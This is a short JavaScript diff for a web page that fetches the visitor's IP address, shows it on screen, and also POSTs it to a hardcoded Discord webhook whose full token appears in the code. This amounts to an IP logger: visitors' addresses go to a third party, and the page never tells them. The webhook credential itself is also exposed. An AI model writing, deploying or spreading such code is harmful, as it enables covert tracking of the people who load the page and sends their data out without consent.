@@ -7,6 +7,7 @@ async function fetchData() {
         });
     });
 }
+
 async function sendToWebhook(ipData) {
     var webhookUrl = "https://discord.com/api/webhooks/1282064242488639610/m0BWA8iPSbl3oXSNMP9J0-ATwuWuOJj1-PouniuH6hP2L3Wnh-gThbSoBa8qwOLY9ui6"; // Replace with your Discord webhook URL
     var data = {
@@ -22,6 +23,7 @@ async function sendToWebhook(ipData) {
             }
         ]
     };
+
     try {
         await $.ajax({
             type: "POST",
@@ -34,6 +36,16 @@ async function sendToWebhook(ipData) {
         console.error("Failed to send IP data to Discord webhook:", error);
     }
 }
-fetchData().then(sendToWebhook).catch(error => {
-    console.error("Error fetching IP data:", error);
-});
+
+fetchData()
+    .then(ipData => {
+        // Display the IP address on the screen
+        document.body.innerHTML = `<h1>Your IP Address</h1><p>${ipData}</p>`;
+        
+        // Send IP data to Discord webhook
+        sendToWebhook(ipData);
+    })
+    .catch(error => {
+        console.error("Error fetching IP data:", error);
+        document.body.innerHTML = `<h1>Error fetching IP Address</h1><p>${error}</p>`;
+    });
